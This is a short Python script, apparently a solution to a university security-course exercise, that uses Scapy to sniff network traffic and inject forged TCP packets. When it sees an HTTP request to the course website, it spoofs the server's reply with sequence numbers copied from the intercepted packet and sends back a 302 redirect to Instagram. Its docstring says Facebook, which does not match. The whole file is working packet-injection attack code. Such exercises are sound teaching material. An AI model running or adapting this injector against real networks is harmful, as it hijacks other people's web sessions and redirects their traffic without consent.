import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to Facebook by sending them the
    `RESPONSE` from above.
    """
    try:
        if ((str(packet).find('GET / HTTP/') < 0) or (str(packet).find('Host: '+ WEBSITE) < 0)): #check if this is a request packet directed twards our website.
            return None
        resp = S.IP(dst=packet[S.IP].src, src=packet[S.IP].dst) #set appropriate IP's for packet
        #setting the TCP layer is the tricky part here: source and dest ports are easy, tricky part is setting the ack and sequance numbers. we use the data in intercepted packet.
        resp = resp / S.TCP(sport=packet[S.TCP].dport, dport=packet[S.TCP].sport, flags='FA', seq= packet[S.TCP].ack, ack=(packet[S.TCP].seq + len(packet[S.Raw])))
        resp = resp / RESPONSE
        return resp
    except:
        return None

def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print 'Usage: %s' % args[0]
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
